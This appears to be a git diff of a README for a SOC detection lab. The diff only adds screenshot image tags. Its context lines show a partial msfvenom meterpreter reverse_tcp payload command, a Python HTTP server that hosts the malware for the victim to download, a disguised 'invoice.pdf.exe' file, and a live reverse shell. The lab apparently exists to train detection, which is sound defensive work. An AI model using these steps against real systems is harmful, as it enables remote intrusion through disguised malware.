@@ -95,6 +95,9 @@ msfvenom -p windows/x64/meterpreter_reverse_tcp \
 
 ### 5. Serving the Payload (HTTP Server on Port 9999)
 The malware binary is hosted on the Kali machine using Python's built-in HTTP server so the victim can download it.
+<p>
+  <img src="soc-detection-lab/python3.png" width="700"/>
+</p>
 
 ```bash
 python3 -m http.server 9999
@@ -117,6 +120,11 @@ C:\Users\Public\invoice.pdf.exe
 ```
 
 A reverse shell session is now active on the attacker machine.
+
+<p>
+  <img src="soc-detection-lab/window_binary_running.png" width="500"/>
+  <img src="soc-detection-lab/reverse_shell_active.png" width="500"/>
+</p>
 
 ---
 
